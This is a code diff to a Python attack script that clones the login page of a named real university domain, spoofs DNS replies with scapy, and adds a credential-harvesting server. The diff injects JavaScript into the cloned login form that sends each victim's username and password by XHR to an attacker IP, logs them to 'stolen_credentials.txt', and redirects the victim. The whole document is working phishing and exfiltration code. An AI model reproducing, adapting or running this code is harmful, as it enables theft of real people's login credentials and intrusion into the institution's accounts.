@@ -2,7 +2,7 @@ import os
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin, urlparse
-from http.server import SimpleHTTPRequestHandler
+from http.server import SimpleHTTPRequestHandler, HTTPServer, BaseHTTPRequestHandler
 import socketserver
 from threading import Thread
 from scapy.all import *
@@ -11,6 +11,7 @@ from scapy.all import *
 attacker_ip = "192.168.2.1"  # Replace with your actual IP address
 target_domain = "fs.singaporetech.edu.sg"
 cloned_site_dir = "cloned_site"
+attacker_server_port = 8080
 
 # Function to clone the website
 def clone_website(url, save_dir):
@@ -67,12 +68,57 @@ def dns_spoof(pkt):
             send(spoofed_pkt, verbose=0)
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
 
+# Define the attacker's server to capture credentials
+class StealCredentialsHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+        parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
+
+        username = parsed_data.get('username', [''])[0]
+        password = parsed_data.get('password', [''])[0]
+
+        with open("stolen_credentials.txt", "a") as f:
+            f.write(f"Username: {username}, Password: {password}\n")
+
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(b"Credentials stolen successfully")
+
+# Start the attacker's server
+def start_attacker_server():
+    server_address = ('', attacker_server_port)
+    httpd = HTTPServer(server_address, StealCredentialsHandler)
+    print(f"Attacker server running on port {attacker_server_port}")
+    httpd.serve_forever()
+
 # Clone the website
 clone_website(f"https://{target_domain}", cloned_site_dir)
 
+# Update the cloned index.html to include the credential stealing script
+index_path = os.path.join(cloned_site_dir, 'index.html')
+with open(index_path, 'r', encoding='utf-8') as file:
+    html_content = file.read()
+
+html_content = html_content.replace(
+    '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="http://fs.singaporetech.edu.sg">',
+    '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://fs.singaporetech.edu.sg">'
+).replace(
+    '<script type="text/javascript">',
+    '<script type="text/javascript">\nfunction sendCredentials() {\n    var userName = document.getElementById(\'userNameInput\').value;\n    var password = document.getElementById(\'passwordInput\').value;\n\n    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "http://{attacker_ip}:{attacker_server_port}/steal", true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));\n\n    window.location.href = "https://xsite.singaporetech.edu.sg";\n    return false;\n}\n'
+)
+
+with open(index_path, 'w', encoding='utf-8') as file:
+    file.write(html_content)
+
 # Start the web server in a separate thread
-web_server_thread = Thread(target=start_web_server, args=(80, "test1"))
+web_server_thread = Thread(target=start_web_server, args=(8082, "test1"))
 web_server_thread.start()
+
+# Start the attacker's server in a separate thread
+attacker_server_thread = Thread(target=start_attacker_server)
+attacker_server_thread.start()
 
 # Start DNS spoofing
 print("Starting DNS spoofing...")
